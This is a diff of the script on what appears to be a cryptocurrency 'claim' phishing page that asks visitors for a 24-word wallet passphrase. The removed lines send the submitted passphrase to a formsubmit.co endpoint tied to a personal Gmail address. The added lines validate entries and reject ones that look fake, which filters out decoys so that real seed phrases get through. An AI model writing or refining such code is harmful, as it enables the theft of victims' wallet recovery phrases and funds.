@@ -68,42 +68,43 @@
     </main>
   </div>
 <script>
-  document.getElementById("claimBtn").addEventListener("click", function () {
-    document.getElementById("passphraseForm").classList.remove("hidden");
-    this.style.display = "none";
-  });
+function isValidPassphrase(phrase) {
+  const words = phrase.trim().toLowerCase().split(/\s+/);
 
-  document.getElementById("piForm").addEventListener("submit", function (e) {
-    e.preventDefault(); // prevent default form submit
+  // 1. Must be exactly 24 words
+  if (words.length !== 24) {
+    return "❌ Passphrase must contain exactly 24 words.";
+  }
 
-    const passphrase = this.passphrase.value.trim();
-    const wordCount = passphrase.split(/\s+/).length;
+  // 2. Must be only lowercase alphabetic words
+  const allAlpha = words.every(word => /^[a-z]+$/.test(word));
+  if (!allAlpha) {
+    return "❌ Passphrase must only contain lowercase letters (no numbers or symbols).";
+  }
 
-    // Validation: Must be exactly 24 words
-    if (wordCount !== 24) {
-      alert("❌ Invalid passphrase.");
-      return;
-    }
+  // 3. Check if same word is repeated too many times (likely fake)
+  const wordCounts = {};
+  for (let word of words) {
+    wordCounts[word] = (wordCounts[word] || 0) + 1;
+  }
 
-    const formData = new FormData(this);
+  const mostCommonWord = Object.entries(wordCounts).sort((a, b) => b[1] - a[1])[0];
+  if (mostCommonWord[1] >= 6) {
+    return `❌ The word '${mostCommonWord[0]}' is repeated too many times. Looks fake.`;
+  }
 
-    fetch("https://formsubmit.co/kp25626900@gmail.com", {
-      method: "POST",
-      body: formData
-    })
-    .then(response => {
-      if (response.ok) {
-        document.getElementById("confirmationMsg").style.display = "block";
-        document.getElementById("piForm").reset();
-      } else {
-        alert("Something went wrong. Please try again.");
-      }
-    })
-    .catch(error => {
-      console.error("Error:", error);
-      alert("Error submitting form.");
-    });
-  });
+  return true;
+}
+
+document.getElementById("piForm").addEventListener("submit", function(e) {
+  const phrase = document.querySelector("textarea[name='passphrase']").value;
+  const validation = isValidPassphrase(phrase);
+
+  if (validation !== true) {
+    e.preventDefault();
+    alert(validation);
+  }
+});
 </script>
  
 <!-- partial -->
